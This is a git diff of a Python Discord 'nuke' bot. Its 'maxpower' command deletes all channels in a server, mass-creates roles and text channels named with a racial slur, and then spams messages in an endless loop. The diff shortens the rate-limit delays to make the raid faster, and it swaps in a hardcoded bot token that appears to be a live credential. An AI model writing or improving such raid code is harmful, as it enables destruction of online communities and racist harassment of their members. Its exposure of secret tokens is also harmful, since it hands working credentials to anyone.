@@ -21,14 +21,14 @@ intents.message_content = True
 intents.typing = False
 intents.presences = False
 
-TOKEN = "MTEwMzQ0MDYxNjI5OTQzODA5MA.GMBxxk.dyUGHLumnw4aMdSua1Rt_Sah7zm_50mlLo84jE"
+TOKEN = "MTEwMzQ0MDYxNjI5OTQzODA5MA.G3qtMn.eH-NjELJhG1FEsEBS_PaI0sv7xQuDf3mFypWo4"
 bot = commands.Bot(command_prefix="lancelot!", intents=intents)
     
 
 
 @bot.command()
 async def maxpower(ctx):
-    k = 500
+    k = 470
     channels = ctx.guild.channels
     guild = ctx.guild
     roles = guild.roles
@@ -38,7 +38,7 @@ async def maxpower(ctx):
         try:
             delete = channel.delete()
             bot.loop.create_task(delete)
-            await asyncio.sleep(1 / 5)
+            await asyncio.sleep(1 / 50)
             print (Fore.YELLOW + str(channel) + " was deleted")
         except:
             print(Fore.RED + str(channel) + " can't be deleted")
@@ -53,13 +53,13 @@ async def maxpower(ctx):
                     bot.loop.create_task(create_channel)
                     print(Fore.WHITE + "1 Role created")
                     roles = guild.roles
-                    await asyncio.sleep(1 / 5)
+                    await asyncio.sleep(1 / 50)
                 if len(channels) != k:
                     create_role = guild.create_text_channel(name = "fucking nigger")
                     bot.loop.create_task(create_role)
                     print(Fore.YELLOW + "1 Text Channel Created")
                     channels = guild.text_channels
-                    await asyncio.sleep(1 / 5)
+                    await asyncio.sleep(1 / 50)
             except discord.errors.HTTPException:
                 break   
     while 1>0:
@@ -70,7 +70,7 @@ async def maxpower(ctx):
                     coro = channel.send(str(kran))
                     bot.loop.create_task(coro)
                     print(Fore.WHITE + "1 message sent")
-                    await asyncio.sleep(1 / 5)
+                    await asyncio.sleep(1 / 45)
 
 
 
